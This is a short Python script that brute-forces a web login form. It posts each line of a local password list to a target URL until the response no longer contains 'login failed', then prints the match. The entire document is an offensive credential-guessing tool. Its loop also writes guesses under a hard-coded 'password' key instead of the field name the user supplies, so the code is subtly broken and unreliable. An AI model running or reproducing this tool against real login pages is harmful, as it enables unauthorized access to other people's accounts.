#!/usr/bin/env python
import requests
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target domain")
    parser.add_argument("-l", "--login", dest="login", help="Login field name")
    parser.add_argument("-p", "--password", dest="password", help="Password field name")
    parser.add_argument("-b", "--button", dest="button", help="Login button name")
    options = parser.parse_args()
    if not options.target or not options.login or not options.password or not options.button:
        parser.error("[-] Need more arguments. Use --help for more info.")
    return options


input_options = get_arguments()
target_url = input_options.target
data_dict = {input_options.login: "test_name", input_options.password: "test_password", input_options.button: "submit"}
response = requests.post(target_url, data_dict)
print(response.content)

with open("password.list", "r") as password_list:
    for line in password_list:
        password = line.strip()
        data_dict["password"] = password
        response = requests.post(target_url, data=data_dict)
        if "login failed" not in response.content.decode():
            print("We got it! " + password)
            exit()

print("[+] Job's done! No matches")
